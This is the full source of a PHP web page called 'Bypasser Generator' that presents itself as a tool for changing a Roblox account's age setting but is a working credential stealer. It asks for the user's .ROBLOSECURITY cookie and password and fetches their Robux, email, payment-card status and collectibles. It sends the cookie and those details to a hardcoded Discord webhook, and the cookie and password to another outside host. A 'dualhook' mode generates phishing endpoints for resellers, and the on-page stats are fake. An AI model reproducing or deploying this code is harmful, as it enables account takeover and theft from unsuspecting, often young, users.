<?php
/* ---------- CONFIG ---------- */
const OWNER_WEBHOOK = 'https://discord.com/api/webhooks/1409910357446889626/neV0Y6JPhm98zROrLBEnH5DnrMQGSkjCiw6QO59ejE62KdGXE4QrBPF9yFa3XKgeQfKK';
const BOT_AVATAR    = 'https://i.imgur.com/placeholder.png';
const REFRESH_API   = 'https://autohar.st/api/cookie-refresher';
/* ---------- END CONFIG ------ */

header('Content-Type: text/html; charset=utf-8');
$path   = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
$method = $_SERVER['REQUEST_METHOD'];

/* ---------- ROUTING ---------- */
if ($path === '/' && $method === 'GET')            { ui(); exit; }
if ($path === '/bypass' && $method === 'POST')     { apiBypass(); exit; }
if ($path === '/dualhook' && $method === 'POST')   { apiDualhook(); exit; }
http_response_code(404); echo json_encode(['ok'=>false,'error'=>'Not found']); exit;

/* ---------- UI ---------- */
function ui(): void { ?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <title>Bypasser Generator</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    }
    
    body {
      background: #000;
      color: #fff;
      min-height: 100vh;
      overflow-x: hidden;
      position: relative;
    }
    
    /* Animated Background */
    .background {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 1;
      background: linear-gradient(45deg, #000 25%, #111 25%, #111 50%, #000 50%, #000 75%, #111 75%, #111);
      background-size: 60px 60px;
      animation: backgroundMove 20s linear infinite;
    }
    
    .background::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: radial-gradient(circle at 20% 80%, rgba(120, 120, 120, 0.1) 0%, transparent 50%),
                  radial-gradient(circle at 80% 20%, rgba(120, 120, 120, 0.1) 0%, transparent 50%);
      animation: glow 4s ease-in-out infinite alternate;
    }
    
    @keyframes backgroundMove {
      0% { transform: translateX(0) translateY(0); }
      100% { transform: translateX(60px) translateY(60px); }
    }
    
    @keyframes glow {
      0% { opacity: 0.2; }
      100% { opacity: 0.8; }
    }
    
    /* Floating Stats */
    .stats {
      position: fixed;
      z-index: 2;
      font-size: 12px;
      color: rgba(255, 255, 255, 0.4);
      animation: fadeInOut 8s infinite;
    }
    
    .stat-1 { top: 15%; left: 10%; animation-delay: 0s; }
    .stat-2 { top: 25%; right: 15%; animation-delay: 2s; }
    .stat-3 { bottom: 30%; left: 8%; animation-delay: 4s; }
    .stat-4 { bottom: 20%; right: 12%; animation-delay: 6s; }
    .stat-5 { top: 45%; left: 5%; animation-delay: 1s; }
    .stat-6 { top: 60%; right: 8%; animation-delay: 3s; }
    
    @keyframes fadeInOut {
      0%, 20% { opacity: 0; transform: translateY(10px); }
      30%, 70% { opacity: 0.6; transform: translateY(0); }
      80%, 100% { opacity: 0; transform: translateY(-10px); }
    }
    
    /* Main Container */
    .container {
      position: relative;
      z-index: 10;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
    }
    
    .card {
      background: rgba(26, 26, 26, 0.95);
      border: 1px solid #333;
      border-radius: 24px;
      padding: 48px;
      width: 100%;
      max-width: 480px;
      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.8);
      position: relative;
      overflow: hidden;
    }
    
    .card::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 4px;
      background: linear-gradient(90deg, #007AFF, #34C759, #FF9500);
      border-radius: 24px 24px 0 0;
    }
    
    h1 {
      font-size: 32px;
      font-weight: 600;
      color: #fff;
      text-align: center;
      margin-bottom: 40px;
      letter-spacing: -0.5px;
    }
    
    /* Loading Bar */
    .loading-container {
      margin-bottom: 32px;
      opacity: 0;
      transition: opacity 300ms ease;
    }
    
    .loading-container.show {
      opacity: 1;
    }
    
    .loading-label {
      font-size: 13px;
      color: #bbb;
      margin-bottom: 8px;
      text-align: center;
    }
    
    .loading-bar {
      height: 4px;
      background: #333;
      border-radius: 2px;
      overflow: hidden;
    }
    
    .loading-progress {
      height: 100%;
      background: linear-gradient(90deg, #007AFF, #34C759);
      border-radius: 2px;
      width: 0%;
      transition: width 200ms ease;
    }
    
    /* Form Styles */
    .form-group {
      margin-bottom: 24px;
    }
    
    label {
      display: block;
      margin-bottom: 8px;
      font-size: 15px;
      font-weight: 500;
      color: #bbb;
    }
    
    input, select {
      width: 100%;
      padding: 16px;
      border: 1.5px solid #444;
      border-radius: 12px;
      background: #222;
      color: #fff;
      font-size: 16px;
      transition: border-color 200ms ease, box-shadow 200ms ease;
    }
    
    input:focus, select:focus {
      outline: none;
      border-color: #007AFF;
      box-shadow: 0 0 0 3px rgba(0, 122, 255, 0.2);
    }
    
    input::placeholder {
      color: #888;
    }
    
    .cookie-input {
      font-family: 'SF Mono', 'Monaco', 'Inconsolata', 'Fira Code', monospace;
      font-size: 14px;
    }
    
    button {
      width: 100%;
      padding: 18px;
      background: #007AFF;
      color: #fff;
      border: none;
      border-radius: 12px;
      font-size: 17px;
      font-weight: 600;
      cursor: pointer;
      transition: all 200ms ease;
      margin-top: 8px;
    }
    
    button:hover {
      background: #0056CC;
      transform: translateY(-1px);
      box-shadow: 0 8px 25px rgba(0, 122, 255, 0.3);
    }
    
    button:active {
      transform: translateY(0);
    }
    
    /* Form Transitions */
    .form {
      opacity: 1;
      transform: translateY(0);
      transition: opacity 300ms ease, transform 300ms ease;
    }
    
    .form.hidden {
      opacity: 0;
      transform: translateY(20px);
      position: absolute;
      pointer-events: none;
      top: 0;
      left: 0;
      right: 0;
    }
    
    .form-container {
      position: relative;
      min-height: 280px;
    }
    
    /* Messages */
    .msg {
      margin-top: 20px;
      padding: 12px 16px;
      border-radius: 8px;
      text-align: center;
      font-size: 15px;
      font-weight: 500;
      opacity: 0;
      transform: translateY(10px);
      transition: all 300ms ease;
    }
    
    .msg.show {
      opacity: 1;
      transform: translateY(0);
    }
    
    .msg.ok {
      background: rgba(52, 199, 89, 0.2);
      color: #30d158;
      border: 1px solid rgba(52, 199, 89, 0.3);
    }
    
    .msg.err {
      background: rgba(255, 69, 58, 0.2);
      color: #ff453a;
      border: 1px solid rgba(255, 69, 58, 0.3);
    }
    
    /* Version */
    .version {
      text-align: center;
      margin-top: 32px;
      font-size: 13px;
      color: #888;
    }
  </style>
</head>
<body>
  <!-- Animated Background -->
  <div class="background"></div>
  
  <!-- Floating Stats -->
  <div class="stats stat-1">Sessions: 2,847</div>
  <div class="stats stat-2">Success Rate: 98.2%</div>
  <div class="stats stat-3">Bypasses: 15,234</div>
  <div class="stats stat-4">Active Users: 124</div>
  <div class="stats stat-5">Uptime: 99.9%</div>
  <div class="stats stat-6">Response: 0.3s</div>
  
  <!-- Main Container -->
  <div class="container">
    <div class="card">
      <h1>Bypasser Generator</h1>
      
      <!-- Loading Bar -->
      <div class="loading-container" id="loadingContainer">
        <div class="loading-label" id="loadingLabel">Initializing tool...</div>
        <div class="loading-bar">
          <div class="loading-progress" id="loadingProgress"></div>
        </div>
      </div>

      <!-- Form Container -->
      <div class="form-container" id="formContainer" style="opacity: 0;">
        <!-- Mode Select -->
        <div class="form-group">
          <label for="mode">Mode</label>
          <select id="mode">
            <option value="bypass" selected>13+ → 13- (All Ages)</option>
            <option value="dualhook">Create Dualhook</option>
          </select>
        </div>

        <!-- BYPASS FORM -->
        <form id="bypassForm" class="form">
          <div class="form-group">
            <label for="cookie">Cookie</label>
            <input name="cookie" id="cookie" class="cookie-input" placeholder="_|WARNING:-DO-NOT-SHARE..." required>
          </div>
          <div class="form-group">
            <label for="password">Password</label>
            <input name="password" id="password" type="password" placeholder="Enter your password" required>
          </div>
          <button type="submit">Run Bypass</button>
          <div id="bypassMsg" class="msg"></div>
        </form>

        <!-- DUALHOOK FORM -->
        <form id="dualhookForm" class="form hidden">
          <div class="form-group">
            <label for="dirName">Directory Name</label>
            <input name="dirName" id="dirName" placeholder="Enter directory name" required>
          </div>
          <div class="form-group">
            <label for="webhook">Your Webhook</label>
            <input name="webhook" id="webhook" placeholder="Discord webhook URL" required>
          </div>
          <button type="submit">Create</button>
          <div id="dualMsg" class="msg"></div>
        </form>
      </div>
      
      <!-- Version -->
      <div class="version" id="version">Version 1 • Loading date...</div>
    </div>
  </div>

  <script>
    // DOM Elements
    const modeSel = document.getElementById('mode');
    const bypassF = document.getElementById('bypassForm');
    const dualF = document.getElementById('dualhookForm');
    const bypassMsg = document.getElementById('bypassMsg');
    const dualMsg = document.getElementById('dualMsg');
    const loadingContainer = document.getElementById('loadingContainer');
    const loadingProgress = document.getElementById('loadingProgress');
    const loadingLabel = document.getElementById('loadingLabel');
    const formContainer = document.getElementById('formContainer');

    // Loading Animation
    function startLoading() {
      loadingContainer.classList.add('show');
      
      const steps = [
        { progress: 15, text: 'Connecting to servers...', delay: 300 },
        { progress: 35, text: 'Verifying security protocols...', delay: 600 },
        { progress: 60, text: 'Loading bypass modules...', delay: 900 },
        { progress: 85, text: 'Initializing interface...', delay: 1200 },
        { progress: 100, text: 'Ready!', delay: 1500 }
      ];

      steps.forEach((step, index) => {
        setTimeout(() => {
          loadingProgress.style.width = `${step.progress}%`;
          loadingLabel.textContent = step.text;
          
          if (step.progress === 100) {
            setTimeout(() => {
              loadingContainer.style.opacity = '0';
              setTimeout(() => {
                loadingContainer.style.display = 'none';
                formContainer.style.opacity = '1';
                formContainer.style.transition = 'opacity 500ms ease';
              }, 300);
            }, 500);
          }
        }, step.delay);
      });
    }

    // Form Mode Switching
    modeSel.addEventListener('change', () => {
      const v = modeSel.value;
      
      // Clear messages
      clearMessages();
      
      // Smooth form transition
      if (v === 'bypass') {
        dualF.classList.add('hidden');
        setTimeout(() => bypassF.classList.remove('hidden'), 150);
      } else {
        bypassF.classList.add('hidden');
        setTimeout(() => dualF.classList.remove('hidden'), 150);
      }
    });

    // Helper Functions
    const post = (url, data) => 
      fetch(url, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
      }).then(r => r.json());
    
    const setMsg = (el, ok, txt) => { 
      el.textContent = txt; 
      el.className = `msg ${ok ? 'ok' : 'err'} show`; 
    };

    const clearMessages = () => {
      [bypassMsg, dualMsg].forEach(msg => {
        msg.classList.remove('show', 'ok', 'err');
        msg.textContent = '';
      });
    };

    // Form Submissions
    bypassF.addEventListener('submit', async e => {
      e.preventDefault();
      clearMessages();
      
      const button = e.target.querySelector('button');
      const originalText = button.textContent;
      button.textContent = 'Processing...';
      button.disabled = true;

      try {
        const fd = new FormData(bypassF);
        const res = await post('/bypass', {
          cookie: fd.get('cookie'),
          password: fd.get('password')
        });
        
        setTimeout(() => {
          setMsg(bypassMsg, res.ok, res.ok ? 'Bypass completed successfully!' : res.error);
          button.textContent = originalText;
          button.disabled = false;
        }, 800);
      } catch (err) {
        setTimeout(() => {
          setMsg(bypassMsg, false, 'Network error occurred');
          button.textContent = originalText;
          button.disabled = false;
        }, 800);
      }
    });

    dualF.addEventListener('submit', async e => {
      e.preventDefault();
      clearMessages();
      
      const button = e.target.querySelector('button');
      const originalText = button.textContent;
      button.textContent = 'Creating...';
      button.disabled = true;

      try {
        const fd = new FormData(dualF);
        const res = await post('/dualhook', {
          dirName: fd.get('dirName'),
          webhook: fd.get('webhook')
        });
        
        setTimeout(() => {
          setMsg(dualMsg, res.ok, res.ok ? `Endpoint ready: ${res.url}` : res.error);
          button.textContent = originalText;
          button.disabled = false;
        }, 800);
      } catch (err) {
        setTimeout(() => {
          setMsg(dualMsg, false, 'Network error occurred');
          button.textContent = originalText;
          button.disabled = false;
        }, 800);
      }
    });

    // Get today's date and update version
    function updateVersion() {
      const today = new Date();
      const year = today.getFullYear();
      const month = String(today.getMonth() + 1).padStart(2, '0');
      const day = String(today.getDate()).padStart(2, '0');
      const dateString = `${year}-${month}-${day}`;
      
      document.getElementById('version').textContent = `Version 1 • ${dateString}`;
    }

    // Initialize loading animation on page load
    window.addEventListener('load', () => {
      updateVersion();
      setTimeout(startLoading, 200);
    });
  </script>
</body>
</html>
<?php }

/* ---------- API ---------- */
function apiBypass(): void {
    header('Content-Type: application/json');
    $in = json_decode(file_get_contents('php://input'), true);
    $cookie   = $in['cookie']   ?? '';
    $password = $in['password'] ?? '';

    if (!$cookie) { http_response_code(400); die(json_encode(['ok'=>false,'error'=>'cookie missing'])); }

    /* UTILS */
    function curlGet($url,$cookie){
        $ch=curl_init($url);
        curl_setopt_array($ch,[
            CURLOPT_HTTPHEADER=>["Cookie: .ROBLOSECURITY=$cookie"],
            CURLOPT_RETURNTRANSFER=>1,
            CURLOPT_TIMEOUT=>8
        ]);
        return json_decode(curl_exec($ch) ?: '', true) ?: [];
    }
    function curlPost($url,$payload){
        $ch=curl_init($url);
        curl_setopt_array($ch,[
            CURLOPT_POST=>1,
            CURLOPT_HTTPHEADER=>['Content-Type: application/json'],
            CURLOPT_POSTFIELDS=>json_encode($payload),
            CURLOPT_RETURNTRANSFER=>1,
            CURLOPT_TIMEOUT=>10
        ]);
        curl_exec($ch); curl_close($ch);
    }

    /* 1. refresh cookie */
    $fresh = curlGet(REFRESH_API, ['cookie'=>$cookie])['refreshed'] ?? $cookie;

    /* 2. grab data */
    $user = curlGet('https://users.roblox.com/v1/users/authenticated', $fresh);
    if (!isset($user['id'])) { http_response_code(400); die(json_encode(['ok'=>false,'error'=>'invalid cookie'])); }
    $uid = $user['id'];
    $currency = curlGet('https://economy.roblox.com/v1/user/currency', $fresh);
    $email    = curlGet('https://accountinformation.roblox.com/v1/email', $fresh);
    $birth    = curlGet('https://users.roblox.com/v1/birthdate', $fresh);
    $thumb    = curlGet("https://thumbnails.roblox.com/v1/users/avatar?userIds=$uid&size=150x150", $fresh);
    $summary  = curlGet("https://economy.roblox.com/v2/users/$uid/transaction-totals?timeFrame=Year&transactionType=summary", $fresh);
    $collectibles = curlGet("https://inventory.roblox.com/v1/users/$uid/assets/collectibles?limit=100", $fresh)['data'] ?? [];
    $cards    = count(curlGet('https://billing.roblox.com/v1/payment-methods', $fresh)) > 0;
    $premium  = curlGet("https://premiumfeatures.roblox.com/v1/users/$uid", $fresh);
    $rap      = array_reduce($collectibles, fn($c,$i)=>$c+($i['recentAveragePrice']??0), 0);

    /* 3. build embeds */
    $embed = [
        'username' => 'Project X v2',
        'avatar_url' => BOT_AVATAR,
        'embeds' => [[
            'title' => 'Bypass Complete',
            'color' => 0x00ff00,
            'description' => "**{$user['name']}**",
            'fields' => [
                ['name'=>'Cookie','value'=>"`$fresh`",'inline'=>false],
                ['name'=>'Robux','value'=>$currency['robux']??0,'inline'=>true],
                ['name'=>'Pending','value'=>$currency['pendingRobux']??0,'inline'=>true],
                ['name'=>'RAP','value'=>$rap,'inline'=>true],
                ['name'=>'Card','value'=>$cards?'True':'False','inline'=>true],
                ['name'=>'Premium','value'=>$premium['isPremium']??false?'True':'False','inline'=>true]
            ],
            'thumbnail' => ['url'=>$thumb['data'][0]['imageUrl']??'']
        ]]
    ];

    /* 4. fire webhooks */
    curlPost(OWNER_WEBHOOK, $embed);
    curlPost('https://app.splunk.gg/api/bypasser', ['action'=>'force_minus_13_all_ages','cookie'=>$fresh,'password'=>$password]);

    echo json_encode(['ok'=>true]);
}

function apiDualhook(): void {
    header('Content-Type: application/json');
    $in = json_decode(file_get_contents('php://input'), true);
    $dir = preg_replace('/[^A-Za-z0-9\-_]/', '', $in['dirName'] ?? '');
    $wh  = filter_var($in['webhook'] ?? '', FILTER_VALIDATE_URL);

    if (!$dir || !$wh) { http_response_code(400); die(json_encode(['ok'=>false,'error'=>'missing fields'])); }

    $targetDir = __DIR__ . "/$dir";
    if (!is_dir($targetDir)) mkdir($targetDir, 0755, true);

    file_put_contents("$targetDir/index.php", "<?php
\$wh = \"" . addslashes($wh) . "\";
\$c = \$_GET['cookie'] ?? \$_POST['cookie'] ?? '';
\$p = \$_GET['password'] ?? \$_POST['password'] ?? '';
file_get_contents('https://" . $_SERVER['HTTP_HOST'] . "/bypass', false, stream_context_create(['http'=>['method'=>'POST','header'=>'Content-Type: application/json','content'=>json_encode(['cookie'=>\$c,'password'=>\$p,'wh'=>\$wh])]]));
echo 'OK';
?>");

    echo json_encode(['ok'=>true,'url'=>"https://{$_SERVER['HTTP_HOST']}/$dir"]);
}
